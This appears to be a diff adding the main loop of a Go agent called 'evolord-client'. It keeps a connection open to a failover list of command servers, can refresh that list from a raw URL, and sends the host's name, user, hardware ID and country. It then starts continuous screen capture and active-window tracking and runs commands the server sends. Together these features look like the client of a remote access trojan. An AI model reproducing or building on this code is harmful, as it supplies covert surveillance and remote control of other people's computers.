@@ -1,0 +1,329 @@
+package main
+
+import (
+	"context"
+	"crypto/tls"
+	"crypto/x509"
+	"fmt"
+	"log"
+	"net/http"
+	"os"
+	"runtime"
+	"strings"
+	"time"
+
+	"evolord-client/cmd/agent/activewindow"
+	"evolord-client/cmd/agent/capture"
+	"evolord-client/cmd/agent/config"
+	"evolord-client/cmd/agent/handlers"
+	"evolord-client/cmd/agent/plugins"
+	rt "evolord-client/cmd/agent/runtime"
+	"evolord-client/cmd/agent/wire"
+
+	"nhooyr.io/websocket"
+)
+
+func runClient(cfg config.Config) {
+	baseBackoff := computeBaseBackoff()
+	backoff := baseBackoff
+	log.Printf("runtime GOOS=%s GOARCH=%s cfg.OS=%s cfg.Arch=%s", runtime.GOOS, runtime.GOARCH, cfg.OS, cfg.Arch)
+
+	ensureServerURLs(&cfg, baseBackoff)
+
+	if len(cfg.ServerURLs) > 1 {
+		log.Printf("Failover enabled with %d servers:", len(cfg.ServerURLs))
+		for i, url := range cfg.ServerURLs {
+			marker := ""
+			if i == cfg.ServerIndex {
+				marker = " (starting here)"
+			}
+			log.Printf("  [%d] %s%s", i, url, marker)
+		}
+	}
+
+	transport := createHTTPTransport(cfg)
+	currentIndex := cfg.ServerIndex
+	consecutiveFailures := 0
+
+	for {
+
+		if currentIndex >= len(cfg.ServerURLs) {
+			currentIndex = 0
+		}
+
+		currentServer := cfg.ServerURLs[currentIndex]
+		ctx, cancel := context.WithCancel(context.Background())
+		url := fmt.Sprintf("%s/api/clients/%s/stream/ws?role=client", currentServer, cfg.ID)
+
+		header := http.Header{}
+
+		opts := &websocket.DialOptions{
+			Subprotocols:    []string{"binary"},
+			HTTPClient:      &http.Client{Transport: transport},
+			HTTPHeader:      header,
+			CompressionMode: websocket.CompressionContextTakeover, // Enable compression for better bandwidth
+		}
+
+		serverInfo := ""
+		if len(cfg.ServerURLs) > 1 {
+			serverInfo = fmt.Sprintf(" [%d/%d]", currentIndex+1, len(cfg.ServerURLs))
+		}
+		log.Printf("connecting to %s%s (TLS verify: %v)", currentServer, serverInfo, !cfg.TLSInsecureSkipVerify)
+
+		conn, _, err := websocket.Dial(ctx, url, opts)
+		if err != nil {
+			log.Printf("dial failed: %v (retrying in %s)", err, backoff)
+			consecutiveFailures++
+
+			if shouldRefreshRawList(cfg, consecutiveFailures) {
+				if refreshServerURLsFromRaw(&cfg) {
+					currentIndex = 0
+					consecutiveFailures = 0
+				}
+			}
+
+			if len(cfg.ServerURLs) > 1 {
+				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
+				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
+			}
+
+			time.Sleep(backoff)
+			cancel()
+			continue
+		}
+
+		if currentIndex != cfg.ServerIndex {
+			if err := config.SaveServerIndex(currentIndex); err != nil {
+				log.Printf("Warning: failed to save server index: %v", err)
+			}
+		}
+
+		backoff = baseBackoff
+		consecutiveFailures = 0
+		log.Printf("connected successfully to %s%s", currentServer, serverInfo)
+
+		if err := runSession(ctx, cancel, conn, cfg); err != nil {
+			log.Printf("session ended: %v (retrying in %s)", err, backoff)
+
+			if shouldRefreshRawList(cfg, len(cfg.ServerURLs)) {
+				if refreshServerURLsFromRaw(&cfg) {
+					currentIndex = 0
+					consecutiveFailures = 0
+				}
+			}
+
+			if len(cfg.ServerURLs) > 1 {
+				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
+				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
+			}
+		}
+
+		time.Sleep(backoff)
+	}
+}
+
+func ensureServerURLs(cfg *config.Config, backoff time.Duration) {
+	if len(cfg.ServerURLs) > 0 {
+		return
+	}
+
+	if cfg.RawServerListURL == "" {
+		log.Fatal("No server URLs configured")
+	}
+
+	log.Printf("No server URLs configured. Fetching raw list from %s", cfg.RawServerListURL)
+	for len(cfg.ServerURLs) == 0 {
+		if refreshServerURLsFromRaw(cfg) {
+			return
+		}
+		log.Printf("Retrying raw server list fetch in %s", backoff)
+		time.Sleep(backoff)
+	}
+}
+
+func shouldRefreshRawList(cfg config.Config, failures int) bool {
+	if cfg.RawServerListURL == "" {
+		return false
+	}
+	if len(cfg.ServerURLs) == 0 {
+		return true
+	}
+	return failures >= len(cfg.ServerURLs)
+}
+
+func refreshServerURLsFromRaw(cfg *config.Config) bool {
+	urls, err := config.LoadServerURLsFromRaw(cfg.RawServerListURL)
+	if err != nil {
+		log.Printf("[config] WARNING: failed to refresh raw server list: %v", err)
+		return false
+	}
+
+	if len(urls) == 0 {
+		log.Printf("[config] WARNING: raw server list returned no URLs")
+		return false
+	}
+
+	if !equalStringSlices(cfg.ServerURLs, urls) {
+		log.Printf("[config] refreshed raw server list (%d servers)", len(urls))
+		cfg.ServerURLs = urls
+	}
+	return true
+}
+
+func equalStringSlices(a, b []string) bool {
+	if len(a) != len(b) {
+		return false
+	}
+	for i := range a {
+		if a[i] != b[i] {
+			return false
+		}
+	}
+	return true
+}
+
+func createHTTPTransport(cfg config.Config) *http.Transport {
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: cfg.TLSInsecureSkipVerify,
+		MinVersion:         tls.VersionTLS12,
+	}
+
+	if cfg.TLSCAPath != "" {
+		caCert, err := os.ReadFile(cfg.TLSCAPath)
+		if err != nil {
+			log.Printf("[TLS] WARNING: Failed to read CA certificate from %s: %v", cfg.TLSCAPath, err)
+		} else {
+			caCertPool := x509.NewCertPool()
+			if caCertPool.AppendCertsFromPEM(caCert) {
+				tlsConfig.RootCAs = caCertPool
+				log.Printf("[TLS] Loaded custom CA certificate from %s", cfg.TLSCAPath)
+			} else {
+				log.Printf("[TLS] WARNING: Failed to parse CA certificate from %s", cfg.TLSCAPath)
+			}
+		}
+	}
+
+	if cfg.TLSClientCert != "" && cfg.TLSClientKey != "" {
+		cert, err := tls.LoadX509KeyPair(cfg.TLSClientCert, cfg.TLSClientKey)
+		if err != nil {
+			log.Printf("[TLS] WARNING: Failed to load client certificate: %v", err)
+		} else {
+			tlsConfig.Certificates = []tls.Certificate{cert}
+			log.Printf("[TLS] Loaded client certificate for mutual TLS")
+		}
+	}
+
+	if cfg.TLSInsecureSkipVerify {
+		log.Printf("[TLS] WARNING: Certificate verification is DISABLED. This is insecure!")
+	}
+
+	transport := http.DefaultTransport.(*http.Transport).Clone()
+	transport.TLSClientConfig = tlsConfig
+	return transport
+}
+
+func computeBaseBackoff() time.Duration {
+	mode := strings.ToLower(strings.TrimSpace(os.Getenv("EVOLORD_MODE")))
+	_ = mode
+	return 10 * time.Second
+}
+
+func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.Conn, cfg config.Config) (err error) {
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("session panic: %v", r)
+			err = fmt.Errorf("session panic: %v", r)
+		}
+	}()
+	defer cancel()
+	defer conn.Close(websocket.StatusNormalClosure, "bye")
+
+	env := &rt.Env{Conn: conn, Cfg: cfg, Cancel: cancel, SelectedDisplay: handlers.GetPersistedDisplay()}
+	env.Console = rt.NewConsoleHub(env)
+	env.Plugins = plugins.NewManager(env.Conn, plugins.HostInfo{ClientID: cfg.ID, OS: cfg.OS, Arch: cfg.Arch, Version: cfg.Version})
+	defer env.Plugins.Close()
+	dispatcher := handlers.NewDispatcher(env)
+
+	osVal := strings.TrimSpace(cfg.OS)
+	if osVal == "" {
+		osVal = runtime.GOOS
+	}
+
+	archVal := strings.TrimSpace(cfg.Arch)
+	if archVal == "" {
+		archVal = runtime.GOARCH
+	}
+
+	hello := wire.Hello{
+		Type:     "hello",
+		ID:       cfg.ID,
+		HWID:     cfg.HWID,
+		Host:     rt.Hostname(),
+		OS:       osVal,
+		Arch:     archVal,
+		Version:  cfg.Version,
+		User:     rt.CurrentUser(),
+		Monitors: capture.MonitorCount(),
+		Country:  cfg.Country,
+	}
+
+	if err := wire.WriteMsg(ctx, env.Conn, hello); err != nil {
+		return fmt.Errorf("send hello: %w", err)
+	}
+
+	readErr := make(chan error, 1)
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				log.Printf("readLoop panic: %v", r)
+				readErr <- fmt.Errorf("readLoop panic: %v", r)
+				cancel()
+			}
+		}()
+		readErr <- readLoop(ctx, env, dispatcher)
+	}()
+
+	shotCtx, cancelShots := context.WithCancel(ctx)
+	defer cancelShots()
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				log.Printf("capture panic: %v", r)
+				cancel()
+			}
+		}()
+		capture.Loop(shotCtx, env)
+	}()
+
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				log.Printf("activewindow panic: %v", r)
+			}
+		}()
+		if err := activewindow.Start(ctx, env); err != nil {
+			log.Printf("activewindow error: %v", err)
+		}
+	}()
+
+	return <-readErr
+}
+
+func readLoop(ctx context.Context, env *rt.Env, dispatcher *handlers.Dispatcher) error {
+	for {
+
+		conn := env.Conn.(*websocket.Conn)
+		_, data, err := conn.Read(ctx)
+		if err != nil {
+			return err
+		}
+		envelope, err := wire.DecodeEnvelope(data)
+		if err != nil {
+			log.Printf("decode: %v", err)
+			continue
+		}
+		if err := dispatcher.Dispatch(ctx, envelope); err != nil {
+			return err
+		}
+	}
+}
